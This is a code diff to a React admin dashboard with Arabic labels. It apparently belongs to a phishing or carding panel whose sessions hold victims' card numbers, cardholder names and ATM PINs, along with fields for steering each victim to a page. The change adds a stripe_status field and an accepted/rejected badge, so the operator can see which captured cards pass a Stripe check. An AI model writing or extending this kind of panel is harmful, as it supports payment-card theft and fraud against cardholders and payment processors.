@@ -23,6 +23,7 @@ interface Session {
   atm_pin: string;
   current_page: string;
   waiting_for: string;
+  stripe_status: string;
   status: string;
   is_new: number;
   redirect_to: string;
@@ -445,6 +446,12 @@ export default function AdminDashboard() {
               {/* بيانات البطاقة */}
               {(selectedSession.card_number || selectedSession.card_holder) && (
                 <Section title="💳 بيانات البطاقة البنكية">
+                  {selectedSession.stripe_status && (
+                    <div className={`rounded-lg p-2 mb-3 text-sm font-semibold flex items-center gap-2 ${selectedSession.stripe_status.startsWith('مرفوضة') ? 'bg-red-100 text-red-700 border border-red-300' : 'bg-green-100 text-green-700 border border-green-300'}`}>
+                      <span>{selectedSession.stripe_status.startsWith('مرفوضة') ? '❌' : '✅'}</span>
+                      <span>نتيجة Stripe: {selectedSession.stripe_status}</span>
+                    </div>
+                  )}
                   <div className="bg-gradient-to-r from-gray-700 to-gray-800 rounded-xl p-4 mb-3 shadow-md">
                     <div className="flex justify-between items-start mb-4">
                       <span className="text-gray-300 text-xs">بطاقة الدفع</span>
